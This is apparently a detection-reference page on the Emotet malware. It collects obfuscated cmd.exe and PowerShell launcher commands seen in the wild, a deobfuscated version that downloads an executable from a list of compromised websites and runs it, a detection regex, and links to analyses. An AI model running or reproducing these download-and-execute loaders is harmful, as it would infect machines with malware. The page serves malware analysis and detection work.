## Emotet


#### Commands
---

* Cmd.exe

1.
```
dWbtPtDObhv MRZqnKhPtUqbVYjQmpdfvDWCtQj hJNjiiIJOGttb & %C^om^S^pEc% %C^om^S^pEc% /V /c set %loVqFNsnWSOoQXU%=jTMkdiizHojdor&&set %var1%=p&&set %var2%=ow&&set %vRwmclCkupwoRzI%=UuIwUIHrb&&set %var7%=!%var1%!&&set %DKViQiPwiWwsiuj%=wYXlpQhqqUoUsX&&set %var3%=er&&set %var8%=!%var2%!&&set %var4%=s&&set %nJELZbjBiKjpnaL%=pzZCXkjGmm&&set %var5%=he&&set %var6%=ll&&!%var7%!!%var8%!!%var3%!!%var4%!!%var5%!!%var6%! " ( [RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe([RUNtIme.intEropseRVICEs.MarShal]::SeCURestrINgtogLoBaLaLloCUnicOde( $('76492d1116743f0423413b16050a5345MgB8ADYAYwB4AHAAdgAxAHEAdQAvAEkAVQBXADQANQBrAFUAWgBkAEIANwBTAGcAPQA9AHwAYgAyADUAOQAwADMAYgBkAGMAOAA1AGMANwA0ADgAZgBhADUAYQBhAGIAYgBkADcAMwA1ADgAYwA3ADIANwA1ADAAZAA4AGEAYQBiADEANwBkADIAMwA3ADMANABlAGUAOAAxADUAZQA3ADAAOAAxADMAZQAyADIAZQBlADUAOAAxADcAMQAxAGUAOAA4ADUAOQAzADcAMwBlADcAOABmADYAYwA5ADkANAA3ADMAMABhAGMAMwAzADIAMQAxADcAYwA2AGQAMgAxADAAZQAyADQAZgAyAGUAMQA0ADMANABkAGIANAAxADAAMABlADAANAA0AGUAMwBjADYAYQAzAGUANgA2ADQAYQBmADgANwA4ADYAMQAwAGIAOAA2AGYAOQBmADYAOAAyAGUANAA4ADAAOAA3ADQAZgA4AGMAZQAxADUAYQAxADIAYwA5AGIAMgBmADcAYgBhAGQAYwAyADQANQAxADcAOQA4AGMANQA0AGMAYgAwADkAZAA0ADYAMAA4ADYAYQAyAGMAYwAxAGEANAA2ADQAZABmADUAMQBhADQAZQA3AGQAZABlADQANgA5AGQAYwA2ADIAOAA4ADEAMwBiADQAYwBlAGIANQA1ADYAMAAwADUAOQA1ADQAOQBmADAAMgBhADUAOQBiADQANABhAGMAZgAxADEANAA3ADcANgA2ADIAYgA4ADUANwA1ADUANQAxADEAOABlAGQAMAA2ADAAZABiADQAZABjAGMAYQBmADgAYQAzAGYAZQBhAGIAMgA0ADQANgBmADgAMwBlADQANwAyADcAYwBhAGIAMQA2ADIAOQA4ADcANwBlAGYAZAAwADYAYwAyADAAYgAyAGMANABlADIAYgBiAGQAYQA4ADQAZQAzADgAZgA2ADAANQAzAGIAYgBlAGUAZQAzAGQAZQBiAGYAMABkADMAZgA5AGUANwAzADYAZQAwADYANgA4ADUAZAA2ADkAMwBlAGUANwA1ADEAMgA1ADIAMAA3ADEAZgBjADQAMgAxADQAYwBjADYAMQBiADkAYgA0ADEAOQBjADQAOAAzADkANAAyADYAMQAzADgANAA4ADcAYQA5AGQANwAxADkAMAA5AGIANABjADUAYQBiADAAYQA2AGEANABjAGEANgBhADMAZgBiADgAOQBkAGEAZQBkAGUAYwBkAGUAZQA3AGQAYwBiAGEAMwA5ADAAMAA0AGMAMQA2AGMAOQA1AGQAYQA1AGUAYgBmAGYAYwBjADMAYQBlAGUANABiADQAMwBhADAAOQAxAGMAOQA5AGUAZAAzADAAZAA1ADMAOAAxAGUANQAzADAANABlADkAYwAxAGMAMwBmADAANQBlADYAYwA3AGYAMwAxADgANAAxADEANQA0ADIAOQA5AGMAZQA0AGUAMAAzADkAMgA5AGIANQAxADAANgA2ADAAOAA4AGIAMwAzAGYANgBiADcAOQBjAGQAZQA4AGYAZQAxAGYAOAAyADAANQAxADkANgBhAGMANAAzADMAYwAyAGYAYwBlADIAOAAwAGQANgA5ADQANgAwAGEANABlADAAZABjADYAYgBmADkAOAA5AGMAMwA0ADQAZgAzADIAZQBiAGMAOABkADcANwBhADkAMwAwAGQAMAA4AGEAZgA4ADkAYgAyAGUAZAAyAGQAMAA1ADEANwAxADMAOQA1ADIAOQBhAGUANgAzADYAMwBhADMAOQBiAGEAZQA4AGYAZQBiAGMAYQAyADMAYgAxADQAZQAyAGYAOABkAGUAOAA2AGIAOQA0AGYANAA0AGQAMABhADEAZgBmADAAOABjADkAYgBlAGQANABmAGIAMgBiADMAYQA5ADEAZgBiAGMANgAyADcAMwA4AGUAYQBjADAAZABlADkAZgBiAGUAYwAxAGUAOAA4ADkANwA5ADAAOAAyAGIANgAxADUAMQA3AGQAMwBmADUAZABkADMAZgBmADUAZQA1AGUANABlADMANgAzAGYANwA4ADMAMwA2AGEANgAyAGUANwAyADcAYQAyAGIAMwA2ADgAMgBiADUANAAxADcAOQBjADAAYgA5ADIAZQBjADQANQAxADcANwBmADIAYgBiADgAOAA0ADAANgAxAGMAMAA5ADgANgBkADcAMAA2ADcANwAxAGMAYgBiADEANgBmADEAMQAyADAANQA2AGMANQAyADkAMgAyADMAMQAwAGMAYQAyADkAOQBjADgAMwAyAGYANQBmADUAYgA4AGUAZgBhADAAZQBkADgANABjAGUAMQBiAGIAMgBlAGEANwAyAGQAYQA5ADcAOQAwADcAZgBjADgAZQA2ADQANwA2AGIANwA2ADgAZAAzAGUAZAAwADgANQBkADQAYwA4AGYAYwAxADAAZQBkADAAMQA2AGQANQAxADkAOQAxADUAZAA4ADgANwBjAGUAMgBkADgANwAxADAAMgBmADgANgAwADkANAA1AGEAOABkAGMAYgA4AGYAZQAwAGUAZQBkAGQAOQA5ADYANwBkADkAYQAzAGIANgBjAGMAZgBjAGIAMQA0ADEAZAAxADEAZABlADQAZgAwADgANAAyADcAOAA1ADYANwAyADUAOABhADEAZgBjADcAZQA3ADgANwA1ADUAYQBkADgAMgA3ADkAMgAxAGYAZgA1ADIAZQA0ADMAYwA2ADIAYQAwADEAOQBjADEAMgBiADgAOQAyADIAMgAwADAAOAA5ADEAYwBjADEAMAA4ADMAZQA2ADAAOQBkADQAMwAwADAAMQA1ADAANABjADQAYgA5ADMAMwAyAGEAMgA0ADYAMgAzADUANgA5ADgAMQBkADkAOQBjADgAMgAxADIAYwA0ADEANAA5AGYAZgBlADAAZAAyAGIAZQBhAGIAYgA5AGEANwBhADMAZAA3AGMAZAAxADgAOQBiADEAMQAzADUANABkAGUAOAAyAGQAMgAwAGUAMQAzAGQAZAA0AGEAZAA5ADIAYgA3AGQANwA3ADYAYwA0AGIAYwA0ADEAZAA1ADcAZgBlAGMAOQBmADcAZABjAGMAZQBiADcAZgBmADMAMAA1ADAAZQA3AGQANgBjADkAMQA0AGYANQBlADUAYgBjADIAOAAzADgAMQA3ADUAYQBjADAANgBhAGYAMgBiADAANwBlADYAZABlADYAZgA5ADEAMgBmADEAMgAyAGYAMAA3AGMANABhADMANwBhAGQANwAzADAANQBhADEAZABmAGMANAA5ADAAMgBlAGEAYQAwAGEAMwBkADQAYgA4ADQANgBlADcAZgAyADkAMQA3AGQAOABjADAANwA1AGQAYwA2ADEAOQBmADYAMwBiADQAMABmAGQAMwA3AGIAYQA4ADEAZAAzADQANABkADEAYwA0AGMAMgBiADQAMgBhADEANAA5AGMAZAA2AGUAYgAwAGMAZgAxADMAZgA3AGMAOQA4ADgANwAzADYAYwBjADIAMwA5ADgAMgA5AGIAZABlADIANwBiAGMAYgA0ADgAOAA3AGQAOAA3ADcANQA5ADIAMgAyADgAZQAwAGUAZgBmAGEAMAA3AGUAZgA5ADEANwAyADcAMwBlAGQANAAyADcAYgBhAGIAYgAzADEAMgA5AGYAOABlADUANQAwADQANgAwADQANQBmAGMAZABiAGQAMABjADQANQAxADYAYQAwADMANQA5ADQAOQAwAGUAYgAyAGUAMAAwAGEAOAAyAGEANQAxADEANgA2AGEANgA5ADEAMAA5AGQAYwA0AGMAZABmADkANwA5AGIAYgBkADIAZgA2AGQAZgBjADgAMABjAGUANgAxAGYAMwAyADUAZgBlADQAMgBlADQAOABkADAAMwAxADEANQBiADcANgA2ADUAMwBkAGEAOAAxADMAMgBkAGMAYQAxADQAYwA0ADMANAAyADkANwBmADAAOAA1AGEANwA5AGMANQBhADEANgBlADQAZAA5AGMAOAAyADMANgA1ADkAOAAwAGEAMwBlAGIAZABiADAAMQBmADkAZQA2AGYAMwAyAGIAMwAxADUAZABjADEAMQBlADMAYQBkAGYANgAxADEAZAAxADMAOQAyADIANQBmADgAOAAyAGMANwA4ADQAZgBmADQAMQBiAGQAZgBhADYAMABlADcAOQA4ADQANgA1ADEAYQBjADUAYwBjADcAMwA1ADMANwBjAGIANgA1ADQAZAA3ADIAOABjAGYAZQA0AGQAZgA2ADYAMQBkADEANQA3ADIAMQAyAGUAMwA3ADMAMAAxAGEAMABjADkAMQBhAGMAOQBhAGEAMQBkAGQAMgA2ADkAZgBiADcAYgA3AGUAYQBkAGYANAAwAGMANwBlADgAMwA3ADUAYwAxADgAYQA1AGEAMQA3ADcAMgBjAGEAMgAwADcAZgAzADMAOAA4AGEAZAA1ADcAZQBjADUAZQAwADkAMgAzAGYAZQBiAGMAYgA1ADAAZABjADUAMAA2AGEAYQAxAGYAYwBiAGQAYgBkAGIAMwBjADcANgAwADkAOABiADMAZQBmAGQAZAAzAGEAOQA4AGEAYgA3ADcANwBjAGMAMQAzAGEAMgA4ADMAYgBkAGUAMwA5ADgANQBiADMAMAAxAGQANQAxAGUANwA1AGUAYQA2ADgAZQA0AGUAYwBhAGUANABhAGUAOAA5AGMAZgAwADYAZQA0AGYAMQBlAGYAYQBkAGEAMAA1ADgAOQAzADAAMwAwADYAYwA5ADUANQA5AGMAMQBkADgANgBmADgANAAzADYAYwBjADIAMAAwADMAMgAwADMAMgBhADIAZABkADQAZQA0ADEAMwA2ADEANwA2ADQANwAxADIAYgAwADUAZgA1ADcAMAA3AGYAMgBjAGQANABjADAAZQA4ADgAMwBkAGQAYgA3ADgANAA2ADUAYgBkADAANgA4ADkAMgBkADEAOQBjADYAYQA0AGYAMgA2AGQAOABlAGYAZQBjAGIAMgBhADUAYQAyAGYAYQBjAGYAYwBjADIAZgAwADYANgA0ADkAZQAxADgAZABhADYAOQA2AGMANQAyADkAMQA5ADMAOQA3AGUANgA3ADEAMgAzAGUAOAA4AGYAYwA3AGIAMgA1ADIAYwAyAGYAMwAwADcAZABjADQAZgBhAGUANgA1ADEAMQAzADYANAA2ADgAYQA2AGQAMABjAGUAMgAwAGEAOQA3AGEAZgBjADAAZgBlADEAOQAxADkAZQA3AGQAOABhADYANgAwADUAMABkAGYAOQBmAGQAMwA=' |cOnvErtto-SeCureSTrINg -K (35..4)))))| . ( $VERBosePreFERENcE.TOStrIng()[1,3]+'x'-joIn'')
```

2.
```
Cmd/C "Set ctSI= .( ([StriNG]$vERbOSEPrEFeReNce)[1,3]+'x'-JOIN'') (NEW-ObJEct io.CompreSSion.DefLAtestrEaM([IO.MemOrYStReam] [sYsTEm.COnVERT]::frOmbASE64STrINg('PZBda4MwFIb/Si4CqbhGuu3GBqGs28CxrowySmE3MT3W1JhIetAO8b9PZevted7znA/6tdWJhXbusjMoJB+AfA/Z2miwKGiaNgkrEOtlFEmPF4tQcuWq6ICf1q3+SCYLLZUHibqRE453h+1LXP4HlK4L8BXw2kRHiTJS7Q0V0g/DcncdG3nmo8fF+nyj8gLGyMo12p4mMy5OjO9qo3HGViwQdLN/Jwlh9w8xE7TKfULBNkuEqg7ZNwtHHjIOV2Aid8OOqpjRzdsT0ZaM5wUd+p+ODm/gz661xsnjqzYwZe7IKAxEahtXwjwdpFNFZIOnFL2SqIqu738B') ,[IO.CompRessiON.cOmpreSSIoNmoDE]::dECOmPreSs ) ^|FOReach { NEW-ObJEct sYstem.Io.StrEAmreAdeR( $_,[teXT.EnCoDiNG]::aSCii) } ^| foREaCh { $_.rEADtoENd() }) &&POwERshelL $oB84i = [tyPe]( \"{3}{0}{1}{2}\"-F'n','MEN','t','eNvirO' ) ; ${executiOnCONtExt}.\"InVokec`Om`ma`ND\".\"in`VO`KES`CrIPT\"( ( ( GET-IteM variabLE:oB84i ).vaLuE::( \"{1}{3}{2}{0}\" -f 'E','ge','NVIroNmEnTVARiABl','TE' ).Invoke( (\"{0}{1}\" -f'cTs','I'),( \"{1}{2}{0}\"-f 'S','PR','oCEs') ) ))"
```

* Powershell.exe

1.
```
"powershell ( [RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe([RUNtIme.intEropseRVICEs.MarShal]::SeCURestrINgtogLoBaLaLloCUnicOde( $('76492d1116743f0423413b16050a5345MgB8ADYAYwB4AHAAdgAxAHEAdQAvAEkAVQBXADQANQBrAFUAWgBkAEIANwBTAGcAPQA9AHwAYgAyADUAOQAwADMAYgBkAGMAOAA1AGMANwA0ADgAZgBhADUAYQBhAGIAYgBkADcAMwA1ADgAYwA3ADIANwA1ADAAZAA4AGEAYQBiADEANwBkADIAMwA3ADMANABlAGUAOAAxADUAZQA3ADAAOAAxADMAZQAyADIAZQBlADUAOAAxADcAMQAxAGUAOAA4ADUAOQAzADcAMwBlADcAOABmADYAYwA5ADkANAA3ADMAMABhAGMAMwAzADIAMQAxADcAYwA2AGQAMgAxADAAZQAyADQAZgAyAGUAMQA0ADMANABkAGIANAAxADAAMABlADAANAA0AGUAMwBjADYAYQAzAGUANgA2ADQAYQBmADgANwA4ADYAMQAwAGIAOAA2AGYAOQBmADYAOAAyAGUANAA4ADAAOAA3ADQAZgA4AGMAZQAxADUAYQAxADIAYwA5AGIAMgBmADcAYgBhAGQAYwAyADQANQAxADcAOQA4AGMANQA0AGMAYgAwADkAZAA0ADYAMAA4ADYAYQAyAGMAYwAxAGEANAA2ADQAZABmADUAMQBhADQAZQA3AGQAZABlADQANgA5AGQAYwA2ADIAOAA4ADEAMwBiADQAYwBlAGIANQA1ADYAMAAwADUAOQA1ADQAOQBmADAAMgBhADUAOQBiADQANABhAGMAZgAxADEANAA3ADcANgA2ADIAYgA4ADUANwA1ADUANQAxADEAOABlAGQAMAA2ADAAZABiADQAZABjAGMAYQBmADgAYQAzAGYAZQBhAGIAMgA0ADQANgBmADgAMwBlADQANwAyADcAYwBhAGIAMQA2ADIAOQA4ADcANwBlAGYAZAAwADYAYwAyADAAYgAyAGMANABlADIAYgBiAGQAYQA4ADQAZQAzADgAZgA2ADAANQAzAGIAYgBlAGUAZQAzAGQAZQBiAGYAMABkADMAZgA5AGUANwAzADYAZQAwADYANgA4ADUAZAA2ADkAMwBlAGUANwA1ADEAMgA1ADIAMAA3ADEAZgBjADQAMgAxADQAYwBjADYAMQBiADkAYgA0ADEAOQBjADQAOAAzADkANAAyADYAMQAzADgANAA4ADcAYQA5AGQANwAxADkAMAA5AGIANABjADUAYQBiADAAYQA2AGEANABjAGEANgBhADMAZgBiADgAOQBkAGEAZQBkAGUAYwBkAGUAZQA3AGQAYwBiAGEAMwA5ADAAMAA0AGMAMQA2AGMAOQA1AGQAYQA1AGUAYgBmAGYAYwBjADMAYQBlAGUANABiADQAMwBhADAAOQAxAGMAOQA5AGUAZAAzADAAZAA1ADMAOAAxAGUANQAzADAANABlADkAYwAxAGMAMwBmADAANQBlADYAYwA3AGYAMwAxADgANAAxADEANQA0ADIAOQA5AGMAZQA0AGUAMAAzADkAMgA5AGIANQAxADAANgA2ADAAOAA4AGIAMwAzAGYANgBiADcAOQBjAGQAZQA4AGYAZQAxAGYAOAAyADAANQAxADkANgBhAGMANAAzADMAYwAyAGYAYwBlADIAOAAwAGQANgA5ADQANgAwAGEANABlADAAZABjADYAYgBmADkAOAA5AGMAMwA0ADQAZgAzADIAZQBiAGMAOABkADcANwBhADkAMwAwAGQAMAA4AGEAZgA4ADkAYgAyAGUAZAAyAGQAMAA1ADEANwAxADMAOQA1ADIAOQBhAGUANgAzADYAMwBhADMAOQBiAGEAZQA4AGYAZQBiAGMAYQAyADMAYgAxADQAZQAyAGYAOABkAGUAOAA2AGIAOQA0AGYANAA0AGQAMABhADEAZgBmADAAOABjADkAYgBlAGQANABmAGIAMgBiADMAYQA5ADEAZgBiAGMANgAyADcAMwA4AGUAYQBjADAAZABlADkAZgBiAGUAYwAxAGUAOAA4ADkANwA5ADAAOAAyAGIANgAxADUAMQA3AGQAMwBmADUAZABkADMAZgBmADUAZQA1AGUANABlADMANgAzAGYANwA4ADMAMwA2AGEANgAyAGUANwAyADcAYQAyAGIAMwA2ADgAMgBiADUANAAxADcAOQBjADAAYgA5ADIAZQBjADQANQAxADcANwBmADIAYgBiADgAOAA0ADAANgAxAGMAMAA5ADgANgBkADcAMAA2ADcANwAxAGMAYgBiADEANgBmADEAMQAyADAANQA2AGMANQAyADkAMgAyADMAMQAwAGMAYQAyADkAOQBjADgAMwAyAGYANQBmADUAYgA4AGUAZgBhADAAZQBkADgANABjAGUAMQBiAGIAMgBlAGEANwAyAGQAYQA5ADcAOQAwADcAZgBjADgAZQA2ADQANwA2AGIANwA2ADgAZAAzAGUAZAAwADgANQBkADQAYwA4AGYAYwAxADAAZQBkADAAMQA2AGQANQAxADkAOQAxADUAZAA4ADgANwBjAGUAMgBkADgANwAxADAAMgBmADgANgAwADkANAA1AGEAOABkAGMAYgA4AGYAZQAwAGUAZQBkAGQAOQA5ADYANwBkADkAYQAzAGIANgBjAGMAZgBjAGIAMQA0ADEAZAAxADEAZABlADQAZgAwADgANAAyADcAOAA1ADYANwAyADUAOABhADEAZgBjADcAZQA3ADgANwA1ADUAYQBkADgAMgA3ADkAMgAxAGYAZgA1ADIAZQA0ADMAYwA2ADIAYQAwADEAOQBjADEAMgBiADgAOQAyADIAMgAwADAAOAA5ADEAYwBjADEAMAA4ADMAZQA2ADAAOQBkADQAMwAwADAAMQA1ADAANABjADQAYgA5ADMAMwAyAGEAMgA0ADYAMgAzADUANgA5ADgAMQBkADkAOQBjADgAMgAxADIAYwA0ADEANAA5AGYAZgBlADAAZAAyAGIAZQBhAGIAYgA5AGEANwBhADMAZAA3AGMAZAAxADgAOQBiADEAMQAzADUANABkAGUAOAAyAGQAMgAwAGUAMQAzAGQAZAA0AGEAZAA5ADIAYgA3AGQANwA3ADYAYwA0AGIAYwA0ADEAZAA1ADcAZgBlAGMAOQBmADcAZABjAGMAZQBiADcAZgBmADMAMAA1ADAAZQA3AGQANgBjADkAMQA0AGYANQBlADUAYgBjADIAOAAzADgAMQA3ADUAYQBjADAANgBhAGYAMgBiADAANwBlADYAZABlADYAZgA5ADEAMgBmADEAMgAyAGYAMAA3AGMANABhADMANwBhAGQANwAzADAANQBhADEAZABmAGMANAA5ADAAMgBlAGEAYQAwAGEAMwBkADQAYgA4ADQANgBlADcAZgAyADkAMQA3AGQAOABjADAANwA1AGQAYwA2ADEAOQBmADYAMwBiADQAMABmAGQAMwA3AGIAYQA4ADEAZAAzADQANABkADEAYwA0AGMAMgBiADQAMgBhADEANAA5AGMAZAA2AGUAYgAwAGMAZgAxADMAZgA3AGMAOQA4ADgANwAzADYAYwBjADIAMwA5ADgAMgA5AGIAZABlADIANwBiAGMAYgA0ADgAOAA3AGQAOAA3ADcANQA5ADIAMgAyADgAZQAwAGUAZgBmAGEAMAA3AGUAZgA5ADEANwAyADcAMwBlAGQANAAyADcAYgBhAGIAYgAzADEAMgA5AGYAOABlADUANQAwADQANgAwADQANQBmAGMAZABiAGQAMABjADQANQAxADYAYQAwADMANQA5ADQAOQAwAGUAYgAyAGUAMAAwAGEAOAAyAGEANQAxADEANgA2AGEANgA5ADEAMAA5AGQAYwA0AGMAZABmADkANwA5AGIAYgBkADIAZgA2AGQAZgBjADgAMABjAGUANgAxAGYAMwAyADUAZgBlADQAMgBlADQAOABkADAAMwAxADEANQBiADcANgA2ADUAMwBkAGEAOAAxADMAMgBkAGMAYQAxADQAYwA0ADMANAAyADkANwBmADAAOAA1AGEANwA5AGMANQBhADEANgBlADQAZAA5AGMAOAAyADMANgA1ADkAOAAwAGEAMwBlAGIAZABiADAAMQBmADkAZQA2AGYAMwAyAGIAMwAxADUAZABjADEAMQBlADMAYQBkAGYANgAxADEAZAAxADMAOQAyADIANQBmADgAOAAyAGMANwA4ADQAZgBmADQAMQBiAGQAZgBhADYAMABlADcAOQA4ADQANgA1ADEAYQBjADUAYwBjADcAMwA1ADMANwBjAGIANgA1ADQAZAA3ADIAOABjAGYAZQA0AGQAZgA2ADYAMQBkADEANQA3ADIAMQAyAGUAMwA3ADMAMAAxAGEAMABjADkAMQBhAGMAOQBhAGEAMQBkAGQAMgA2ADkAZgBiADcAYgA3AGUAYQBkAGYANAAwAGMANwBlADgAMwA3ADUAYwAxADgAYQA1AGEAMQA3ADcAMgBjAGEAMgAwADcAZgAzADMAOAA4AGEAZAA1ADcAZQBjADUAZQAwADkAMgAzAGYAZQBiAGMAYgA1ADAAZABjADUAMAA2AGEAYQAxAGYAYwBiAGQAYgBkAGIAMwBjADcANgAwADkAOABiADMAZQBmAGQAZAAzAGEAOQA4AGEAYgA3ADcANwBjAGMAMQAzAGEAMgA4ADMAYgBkAGUAMwA5ADgANQBiADMAMAAxAGQANQAxAGUANwA1AGUAYQA2ADgAZQA0AGUAYwBhAGUANABhAGUAOAA5AGMAZgAwADYAZQA0AGYAMQBlAGYAYQBkAGEAMAA1ADgAOQAzADAAMwAwADYAYwA5ADUANQA5AGMAMQBkADgANgBmADgANAAzADYAYwBjADIAMAAwADMAMgAwADMAMgBhADIAZABkADQAZQA0ADEAMwA2ADEANwA2ADQANwAxADIAYgAwADUAZgA1ADcAMAA3AGYAMgBjAGQANABjADAAZQA4ADgAMwBkAGQAYgA3ADgANAA2ADUAYgBkADAANgA4ADkAMgBkADEAOQBjADYAYQA0AGYAMgA2AGQAOABlAGYAZQBjAGIAMgBhADUAYQAyAGYAYQBjAGYAYwBjADIAZgAwADYANgA0ADkAZQAxADgAZABhADYAOQA2AGMANQAyADkAMQA5ADMAOQA3AGUANgA3ADEAMgAzAGUAOAA4AGYAYwA3AGIAMgA1ADIAYwAyAGYAMwAwADcAZABjADQAZgBhAGUANgA1ADEAMQAzADYANAA2ADgAYQA2AGQAMABjAGUAMgAwAGEAOQA3AGEAZgBjADAAZgBlADEAOQAxADkAZQA3AGQAOABhADYANgAwADUAMABkAGYAOQBmAGQAMwA=' |cOnvErtto-SeCureSTrINg -K (35..4)))))| . ( $VERBosePreFERENcE.TOStrIng()[1,3]+'x'-joIn'')
```

Deobfoscated
```
powershell ( [RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe($nsadasd = &(new-object) random;$YYU = .(new-object) System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = 
http://lecap-services .fr/wiB9s/?http://nikitinskysport .ru/R5ytZ/?http://beauty-tea .com/hB2JAMO/?http://zekiatagur .com/gCWu/?http://arkonziv .com/Site7_Pixelhobbies/iV1PKqL/.Split(?);$SDC = $env:public  \  $NSB  ('.exe');foreach($asfc in $ADCX){try{$
YYU."Do`Wnl`OadFI`le"($asfc."ToStr`i`Ng"(), $SDC);&(Invoke-Item)($SDC);break;}catch{})
```
2. Payload with base64 and compressed (deflate/inflate) data also reversed spelling
```
%windir%\SysWOW64\cmd.exe Cmd /C "sEt DIy=$8230C =[CHaR[]] ") )93]rAHC[,)84]rAHC[+701]rAHC[+28]rAHC[(EcaLPErC- 63]rAHC[,'Q8h' EcaLPErC-421]rAHC[,)99]rAHC[+411]rAHC[+201]rAHC[( EcaLPErC-)'nOi'+'ss'+'eR'+'pXE-ekOVNI '+'crf)(Dn'+'eoTda'+'ER.)'+'})'+'iI'+'cS'+'A::'+']Gn'+'IDoCNE'+'.txE'+'t'+'.mE'+'T'+'s'+'YS[ , '+'_Q8h'+' '+'(REDA'+'ErmAe'+'r'+'t'+'S.oi '+'TcEJBO-WEn {'+' tC'+'E'+'jBO'+'-hcAe'+'Ro'+'f '+'crf'+' )'+'s'+'SERp'+'M'+'O'+'CED'+'::'+']EdOm'+'NoIS'+'SErp'+'m'+'O'+'c.noiss'+'erPmoc'+'.Oi[, '+')'+'0kR'+'=='+'wf0gt'+'4jn'+'5w'+'plE'+'56'+'j'+'u'+'T6'+'l'+'U'+'y8Thm'+'dN'+'Rp'+'Y'+'bFvu'+'a'+'GcUFpNDv'+'i'+'S'+'aiRLaT3RXf5'+'R62j'+'22Tq'+'8'+'9'+'yO00xFYyxWaA'+'a'+'PAh/'+'+eeB'+'+'+'/PwGy7wuuEMUTe'+'JCm3c'+'7'+'dD'+'D'+'Nv'+'v0E6'+'ly'+'9'+'A'+'B'+'fdSW9'+'xBKUu'+'DeMT4'+'rPe6id'+'+'+'JMV'+'C2TkqV/f'+'x'+'b'+'a'+'Ky+'+'XLxam'+'q1'+'vrVSpZnJ+Z'+'x0HZ5X'+'N+WpMXQhxM5iSysve+L/J+yhlz'+'6Tt'+'VOy'+'g'+'Ahuy'+'KymQon8'+'J'+'cE7vWmI'+'Gm'+'vhI'+'siwMIrg'+'0'+'Ai'+'LMxX10'+'Vyjy'+'TnY'+'G'+'3E'+'wE'+'UCsEZ6yMT'+'sET'+'nT'+'4Jb'+'nj'+'w'+'ELS'+'5UEl2J'+'syPY9iggb2'+'84'+'aR'+'9bW'+'+Q'+'QN/'+'xtcw'+'J7W'+'++e'+'6b'+'C'+'ZcX'+'/QOmbOaruL'+'vV'+'uK9FG'+'UGBKISY'+'Y'+'QtENgqfNb'+'JIFa6hy/XI'+'FwI8TRBZ'+'P0'+'kR '+'(GNiRt'+'s46E'+'SABMorf:'+':]'+'T'+'REvn'+'OC'+'[]MaEr'+'tSy'+'roMe'+'m'+'.oi.METsys'+'['+' '+'(mAERtSE'+'tAlFe'+'D.'+'N'+'OisSErpM'+'o'+'c.Oi'+'.mETsys'+' Tc'+'EJ'+'B'+'O-'+'WEn ( '(( ()''nIOJ-]2,11,3[EmAN.)'*rDM*' eLbAirav-Teg(( ." ; [ARrAY]::ReveRSE( ( chILDItem ("V"+"ariA"+"b"+"lE:"+"8230C") ).vAlue); [stRiNG]::jOIn( '' ,( chILDItem ("V"+"ariA"+"b"+"lE:"+"8230C") ).vAlue )^|^& ( $veRbOsePrEFerENCe.TOsTRiNG()[1,3]+'x'-JOIn'')&& PowERsheLl SEt-ItEm ('V' + 'ARiAb'+'lE:SKeAil') ( [TYPe]( \"{2}{3}{1}{0}\"-F't','n','ENvIRon','ME' ) ) ; ( .('ls') ( \"{4}{0}{7}{1}{5}{2}{3}{6}\"-f'B','E:E','co','NteX','VarIA','XEcUTiOn','t','l') ).\"VaL`UE\".\"iN`VO`k`eCom`MANd\".( \"{3}{1}{2}{0}\" -f 'ipT','oke','SCr','inv' ).Invoke( ( ${sK`E`AiL}::(\"{0}{4}{1}{2}{5}{3}\" -f'get','ONMeNt','v','E','Envir','arIaBL').Invoke( 'DiY',(\"{1}{0}\"-f's','PrOCeS' ))) )"
```

Launcher
```
 %windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe PowERsheLl SEt-ItEm ('V' + 'ARiAb'+'lE:SKeAil') ( [TYPe]( \"{2}{3}{1}{0}\"-F't','n','ENvIRon','ME' ) ) ; ( .('ls') ( \"{4}{0}{7}{1}{5}{2}{3}{6}\"-f'B','E:E','co','NteX','VarIA','XEcUTiOn','t','l') ).\"VaL`UE\".\"iN`VO`k`eCom`MANd\".( \"{3}{1}{2}{0}\" -f 'ipT','oke','SCr','inv' ).Invoke( ( ${sK`E`AiL}::(\"{0}{4}{1}{2}{5}{3}\" -f'get','ONMeNt','v','E','Envir','arIaBL').Invoke( 'DiY',(\"{1}{0}\"-f's','PrOCeS' ))) )
```


#### Regular Expressions
---

* Powershell.exe

1.
``
^(?=.*\bRuntIME\.InteroPsERvICEs\.marshAl\b)(?=.*\bGeTMEmbERS()\b)(?=.*\bSeCureSTrINg\b)(?=.*\bTOStrIng\b)(?=.*\bjoIn\b).*$
``

#### Resources
---

Technical write-ups:
* https://blog.malwarebytes.com/threat-analysis/2018/05/malware-analysis-decoding-emotet-part-1/
* https://blog.malwarebytes.com/threat-analysis/2018/06/malware-analysis-decoding-emotet-part-2/

Sandbox reports:
* https://www.hybrid-analysis.com/sample/707fedfeadbfa4248cfc6711b5a0b98e1684cd37a6e0544e9b7bde4b86096963?environmentId=100

Notes:
For 2.:
* https://twitter.com/tagnullde/status/1061977580335702019
* Payload partialy written in reverse, stored in environmentvariable, payload is first compressed with deflate, then base64 encoded and then reversed. 
*  -creplace to deobfuscate specific 3 letter strings in the payload with "$" or "|" (Char[xxx])
* 0kR => Rk0 => '
